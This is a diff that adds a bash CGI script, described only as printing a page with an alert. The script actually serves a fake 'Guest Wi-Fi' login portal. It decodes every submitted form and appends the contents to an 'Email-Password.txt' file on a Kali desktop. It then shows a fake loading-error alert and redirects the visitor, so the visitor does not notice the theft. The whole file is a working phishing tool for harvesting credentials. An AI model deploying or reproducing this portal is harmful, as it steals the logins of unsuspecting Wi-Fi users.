@@ -1,0 +1,56 @@
+#!/usr/bin/env bash
+# -------------------------------------------------
+# Mini CGI script that prints a page with an alert
+# -------------------------------------------------
+
+printf "Content-Type: text/html\r\n\r\n"
+
+# --- HTML output ---
+cat <<'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Guest Wi‑Fi </title>
+    <link rel="stylesheet" type="text/css" href="portal.css">
+</head>
+<body>
+<div class="content">
+    <form method="post" id="loginform" name="loginform">
+        <center><p>
+EOF
+
+POST_DATA=$(cat /dev/stdin)
+POST_DATA_D=$(printf '%b' "${POST_DATA//%/\\x}")
+echo "${POST_DATA_D}" >> "/home/kali/Desktop/Email-Password.txt"
+
+# -------------------------------------------------
+# If we received a POST, show an alert and stop
+# -------------------------------------------------
+if [[ "$REQUEST_METHOD" == "POST" && -n "$POST_DATA_D" ]]; then
+    cat <<'EOF'
+        </p></center>
+    </form>
+</div>
+
+<script type="text/javascript">
+    alert("Loading error : \n Close this window.");
+      window.location.href = "end.html";
+</script>
+</body>
+</html>
+EOF
+    exit 0
+fi
+
+# -------------------------------------------------
+# No POST yet – show the normal login form
+# -------------------------------------------------
+cat <<'EOF'
+        </p></center>
+    </form>
+</div>
+</body>
+</html>
+EOF
+exit 0
